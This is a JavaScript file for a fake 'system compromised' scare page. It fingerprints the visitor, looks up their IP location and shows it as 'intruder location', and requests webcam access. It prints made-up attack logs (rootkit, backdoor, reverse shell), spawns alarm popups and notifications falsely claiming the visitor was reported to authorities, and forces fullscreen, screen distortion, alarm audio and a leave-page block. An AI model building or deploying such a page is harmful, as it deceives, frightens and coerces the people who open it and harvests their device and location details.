// --- Create Matrix Background Effect ---
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

// Handle window resize
window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

const katakana = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const nums = '0123456789';
const specialChars = '!@#$%^&*()_+-=[]{}|;:,.<>?/\\';

const alphabet = katakana + latin + nums + specialChars;

const fontSize = 16;
const columns = Math.floor(canvas.width/fontSize);

const drops = [];
for(let x = 0; x < columns; x++) {
    drops[x] = 1;
}

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';
    
    for(let i = 0; i < drops.length; i++) {
        const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
        
        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        
        drops[i]++;
    }
}

// Start Matrix animation
const matrixInterval = setInterval(drawMatrix, 33);

// Auto request fullscreen on page load
function autoRequestFullscreen() {
    // Try to go fullscreen immediately
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen().catch(err => {
            console.log("Fullscreen error:", err);
            // If it fails, try again on first user interaction
            document.addEventListener('click', function() {
                document.documentElement.requestFullscreen().catch(err => {
                    console.log("Fullscreen retry error:", err);
                });
            }, { once: true });
        });
    } else if (document.documentElement.webkitRequestFullscreen) {
        document.documentElement.webkitRequestFullscreen();
    } else if (document.documentElement.msRequestFullscreen) {
        document.documentElement.msRequestFullscreen();
    }
    
    // Auto-create audio context
    setTimeout(() => {
        if (!audioCtx) {
            createAudioContext();
        }
    }, 1000);
}

// Try fullscreen after a short delay (browsers require user interaction)
setTimeout(autoRequestFullscreen, 500);

// --- Custom Cursor ---
// Remove all cursor-related code
// We don't want any custom cursor

// --- Extract User Data with more detail ---
function getUserInfo() {
    let userAgent = navigator.userAgent;
    let platform = navigator.platform;
    let language = navigator.language;
    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    let screenRes = screen.width + "x" + screen.height;
    let referrer = document.referrer || "Direct Access";
    let connection = navigator.connection ? 
                    `Type: ${navigator.connection.effectiveType || 'unknown'}, Downlink: ${navigator.connection.downlink || 'unknown'} Mbps` : 
                    "Connection info unavailable";
    
    // Check for memory info
    let memUsage = "Memory analysis in progress";
    if(window.performance && window.performance.memory) {
        memUsage = `${Math.round(window.performance.memory.usedJSHeapSize / 1048576)} MB / ${Math.round(window.performance.memory.jsHeapSizeLimit / 1048576)} MB`;
    }
    
    return {
        userAgent,
        platform,
        language,
        timezone,
        screenRes,
        referrer,
        connection,
        memUsage
    };
}

function displayUserInfo() {
    let info = getUserInfo();
    let userInfoText = `
        <div class="glitch">
        TARGET SYSTEM IDENTIFIED:<br>
        OS: ${info.platform}<br>
        BROWSER FINGERPRINT: ${info.userAgent}<br>
        LANGUAGE: ${info.language}<br>
        TIMEZONE: ${info.timezone}<br>
        DISPLAY: ${info.screenRes}<br>
        ENTRY POINT: ${info.referrer}<br>
        ${info.connection}<br>
        MEMORY ANALYSIS: ${info.memUsage}
        </div>
    `;

    document.getElementById("userinfo").innerHTML = userInfoText;
}

displayUserInfo();

// Check for battery API separately to avoid errors
if(navigator.getBattery) {
    navigator.getBattery().then(battery => {
        document.getElementById("userinfo").innerHTML += `<br>Battery: ${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not charging"}`;
    }).catch(err => {
        console.log("Battery API error:", err);
    });
}

// --- Terminal Log Effect ---
const terminalLog = document.getElementById('terminalLog');
const logMessages = [
    "> Initiating packet capture...",
    "> Bypassing firewall...",
    "> Collecting system information...",
    "> Downloading rootkit components...",
    "> Scanning for vulnerabilities...",
    "> Exploiting CVE-2023-XXXX...",
    "> Injecting payload...",
    "> Elevating privileges...",
    "> Disabling security services...",
    "> Installing persistent backdoor...",
    "> Capturing keystrokes...",
    "> Initiating data exfiltration...",
    "> Erasing logs...",
    "> Installing monitoring software...",
    "> Backdoor established on port 4444...",
    "> Remote access granted...",
    "> Deploying ransomware components...",
    "> Scanning local network...",
    "> ALERT: Unauthorized access attempt detected",
    "> Countermeasures activated",
    "> Tracing connection...",
    "> Reverse shell established",
    "> Access DENIED - Counterattack initiated"
];

let logIndex = 2; // Start with 2 existing logs

function updateTerminalLog() {
    if(logIndex < logMessages.length) {
        terminalLog.innerHTML += logMessages[logIndex] + "<br>";
        logIndex++;
        terminalLog.scrollTop = terminalLog.scrollHeight;
    }
}

const logInterval = setInterval(updateTerminalLog, 1200);

// --- Countdown Timer ---
let countdown = 10;
const countdownEl = document.getElementById('countdown');

function updateCountdown() {
    countdown--;
    countdownEl.innerText = countdown;
    
    if(countdown <= 10) {
        countdownEl.style.color = countdown % 2 === 0 ? 'yellow' : 'red';
        countdownEl.style.fontSize = countdown % 2 === 0 ? '52px' : '48px';
    }
    
    if(countdown <= 0) {
        countdownEl.innerText = "LOCKED";
        clearInterval(countdownInterval);
        document.body.classList.add('flicker');
        
        // Screen shake effect
        setInterval(() => {
            document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
        }, 100);
    }
}

const countdownInterval = setInterval(updateCountdown, 100);

// --- Auto Open New Tabs ---
function openNewTab() {
    try {
        const popupCount = Math.floor(Math.random() * 2) + 1; // 1 to 2 popups at once (reduced to avoid blocking)
        
        for(let i = 0; i < popupCount; i++) {
            setTimeout(() => {
                const width = 300 + Math.random() * 300;
                const height = 200 + Math.random() * 200;
                const left = Math.random() * (window.screen.width - width);
                const top = Math.random() * (window.screen.height - height);
                
                // Use 'about:blank' to avoid cross-origin issues
                const popup = window.open("about:blank", "_blank", `width=${width},height=${height},left=${left},top=${top}`);
                
                if(popup) {
                    popup.document.write(`
                        <!DOCTYPE html>
                        <html>
                        <head>
                            <style>
                                body { 
                                    background-color: black; 
                                    color: red; 
                                    font-family: monospace;
                                    display: flex;
                                    justify-content: center;
                                    align-items: center;
                                    height: 100vh;
                                    margin: 0;
                                    overflow: hidden;
                                }
                                .message {
                                    font-size: 24px;
                                    text-align: center;
                                    animation: blink 0.5s infinite;
                                }
                                @keyframes blink {
                                    0% { opacity: 1; }
                                    50% { opacity: 0; }
                                    100% { opacity: 1; }
                                }
                            </style>
                        </head>
                        <body>
                            <div class="message">ACCESS DENIED<br>SYSTEM COMPROMISED</div>
                        </body>
                        </html>
                    `);
                    popup.document.close();
                }
            }, i * 500);
        }
    } catch(err) {
        console.log("Popup blocked:", err);
        // Add to terminal log that popups were blocked
        terminalLog.innerHTML += "> Popup deployment blocked by target system<br>";
        terminalLog.scrollTop = terminalLog.scrollHeight;
    }
}

// Randomize the tab opening timing (reduced frequency)
const popupTimes = [800, 1500, 2200];
popupTimes.forEach(time => {
    setTimeout(openNewTab, time);
});

// --- Screen Glitches ---
function applyGlitchEffect() {
    const glitchDuration = 200 + Math.random() * 500;
    document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) invert(${Math.random() > 0.7 ? 1 : 0})`;
    
    setTimeout(() => {
        document.body.style.filter = 'none';
    }, glitchDuration);
}

const glitchInterval = setInterval(applyGlitchEffect, 2000 + Math.random() * 3000);

// --- Webcam Access Attempt (will only show request, not actual video) ---
setTimeout(() => {
    const webcamFeed = document.getElementById('webcamFeed');
    webcamFeed.style.display = 'block';
    
    terminalLog.innerHTML += "> Attempting camera access...<br>";
    terminalLog.scrollTop = terminalLog.scrollHeight;
    
    // Request webcam permission - will just show the browser permission dialog
    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                webcamFeed.srcObject = stream;
                terminalLog.innerHTML += "> Camera access granted. Visual identification in progress...<br>";
                terminalLog.scrollTop = terminalLog.scrollHeight;
            })
            .catch(err => {
                webcamFeed.style.border = '3px solid yellow';
                webcamFeed.style.background = 'url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100%\' height=\'100%\'><text x=\'50%\' y=\'50%\' font-size=\'20\' fill=\'red\' text-anchor=\'middle\' dominant-baseline=\'middle\'>CAMERA BLOCKED</text></svg>") center/cover no-repeat';
                terminalLog.innerHTML += "> Camera access denied. Attempting alternative visual identification...<br>";
                terminalLog.scrollTop = terminalLog.scrollHeight;
            });
    }
}, 10000);

// --- Tilt Screen and Apply other effect ---
let angle = 0;
function distortScreen() {
    angle += 0.05; // Reduced speed
    const distortion = Math.sin(Date.now() / 1000) * 0.01;
    document.body.style.transform = `rotate(${angle}deg) skew(${distortion * 10}deg, ${distortion * 5}deg)`;
}

const distortInterval = setInterval(distortScreen, 100);

// --- Fake Notifications with more alarming messages ---
function sendNotification(title, message) {
    if (Notification.permission === "granted") {
        new Notification(title, { 
            body: message,
            icon: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" stroke="red" stroke-width="4" fill="black" /><text x="50%" y="50%" font-family="Arial" font-size="20" text-anchor="middle" fill="red" dy=".3em">ALERT</text></svg>'
        });
    } else if (Notification.permission !== "denied") {
        Notification.requestPermission().then(permission => {
            if (permission === "granted") {
                sendNotification(title, message);
            }
        });
    }
}

const notificationMessages = [
    { title: "SECURITY ALERT", message: "Connection traced. Remote system identification in progress." },
    { title: "BREACH DETECTED", message: "Malicious activity detected. IP logged and reported." },
    { title: "WARNING", message: "Unauthorized access attempt detected. Countermeasures active." },
    { title: "SYSTEM ALERT", message: "Defense system engaged. Reverse connection established." },
    { title: "CRITICAL WARNING", message: "Your identity has been logged and reported to authorities." },
    { title: "SECURITY BREACH", message: "Connection fingerprint captured. Tracking in progress." }
];

// Send random notifications at varying intervals
for(let i = 0; i < notificationMessages.length; i++) {
    setTimeout(() => {
        const msg = notificationMessages[i];
        sendNotification(msg.title, msg.message);
    }, 5000 + (i * 5000));
}

// --- Fetch and Display Approximate Location ---
function getIPInfo() {
    fetch("https://ipinfo.io/json")
        .then(response => response.json())
        .then(data => {
            let locationText = `
                <div class="warning">
                INTRUDER LOCATION IDENTIFIED<br>
                IP: ${data.ip}<br>
                LOCATION: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}<br>
                PROVIDER: ${data.org || 'Unknown'}<br>
                COORDINATES: ${data.loc || 'Unknown'}<br>
                </div>
            `;
            document.getElementById("userinfo").innerHTML += locationText;

            // Update warning with creepy personalized message
            setTimeout(() => {
                if (data.city && data.country) {
                    document.getElementById("warning").innerHTML = `SECURITY ALERT ${data.city.toUpperCase()}, ${data.country.toUpperCase()}`;
                    
                    // Add to terminal log
                    terminalLog.innerHTML += `> Target location identified: ${data.city}, ${data.country}<br>`;
                    terminalLog.innerHTML += `> Local authorities notified<br>`;
                } else {
                    document.getElementById("warning").innerHTML = `SECURITY ALERT - LOCATION MASKED`;
                    terminalLog.innerHTML += `> Target using proxy. Attempting to bypass...<br>`;
                }
                terminalLog.scrollTop = terminalLog.scrollHeight;
            }, 12000);
        })
        .catch(error => {
            console.error("Error fetching IP info:", error);
            document.getElementById("userinfo").innerHTML += `
                <div class="warning">
                PROXY DETECTED<br>
                ATTEMPTING TO BYPASS...
                </div>
            `;
            terminalLog.innerHTML += "> Location services blocked. Manual trace initiated...<br>";
            terminalLog.scrollTop = terminalLog.scrollHeight;
        });
}

getIPInfo();

// --- Audio Effects ---
let audioCtx = null;

function createAudioContext() {
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        audioCtx = new AudioContext();
        
        // Create alarm sound
        function createAlarm() {
            try {
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                
                oscillator.type = 'sawtooth';
                oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
                
                // Alarm effect
                let alarmInterval = setInterval(() => {
                    oscillator.frequency.exponentialRampToValueAtTime(
                        880, audioCtx.currentTime + 0.1
                    );
                    setTimeout(() => {
                        oscillator.frequency.exponentialRampToValueAtTime(
                            440, audioCtx.currentTime + 0.1
                        );
                    }, 200);
                }, 400);
                
                gainNode.gain.value = 0.1;
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                oscillator.start();
                
                // Stop after 5 seconds
                setTimeout(() => {
                    oscillator.stop();
                    clearInterval(alarmInterval);
                }, 5000);
            } catch(err) {
                console.log("Audio error:", err);
            }
        }
        
        // Random glitch sounds
        function createGlitchSound() {
            try {
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                
                oscillator.type = 'square';
                oscillator.frequency.setValueAtTime(
                    100 + Math.random() * 1000, 
                    audioCtx.currentTime
                );
                
                gainNode.gain.value = 0.1;
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                oscillator.start();
                
                // Random duration
                const duration = 0.1 + Math.random() * 0.3;
                setTimeout(() => {
                    oscillator.stop();
                }, duration * 1000);
            } catch(err) {
                console.log("Audio error:", err);
            }
        }
        
        // Create alarm after countdown reaches 10
        if (countdown > 10) {
            setTimeout(createAlarm, (countdown - 10) * 100);
        } else {
            createAlarm();
        }
        
        // Create random glitch sounds
        let glitchSoundInterval = setInterval(() => {
            if(Math.random() < 0.3) {
                createGlitchSound();
            }
        }, 2000);
        
        // Clean up intervals on page unload
        window.addEventListener('beforeunload', () => {
            clearInterval(glitchSoundInterval);
        });
    } catch(err) {
        console.log("AudioContext error:", err);
    }
}

// --- Automatically attempt fullscreen on any user interaction ---
document.addEventListener('click', () => {
    if (!document.fullscreenElement) {
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen().catch(err => {
                console.log("Fullscreen error:", err);
            });
        } else if (document.documentElement.webkitRequestFullscreen) {
            document.documentElement.webkitRequestFullscreen();
        } else if (document.documentElement.msRequestFullscreen) {
            document.documentElement.msRequestFullscreen();
        }
    }
    
    // Create sound effects when user interacts
    if (!audioCtx) {
        createAudioContext();
    }
    
    // Add to terminal log
    terminalLog.innerHTML += "> Full system scan initiated. Security lockdown in progress...<br>";
    terminalLog.scrollTop = terminalLog.scrollHeight;
});

// Create sound effects when user interacts with page
document.addEventListener('click', function initAudio() {
    if (!audioCtx) {
        createAudioContext();
    }
    // Only need to run once
    document.removeEventListener('click', initAudio);
});

// --- Prevent user from leaving the page ---
window.addEventListener('beforeunload', (event) => {
    // This shows a confirmation dialog when trying to leave/refresh
    event.preventDefault();
    event.returnValue = '';
    return '';
});

// Clean up all intervals when page is closed
window.addEventListener('unload', () => {
    clearInterval(matrixInterval);
    clearInterval(logInterval);
    clearInterval(countdownInterval);
    clearInterval(glitchInterval);
    clearInterval(distortInterval);
});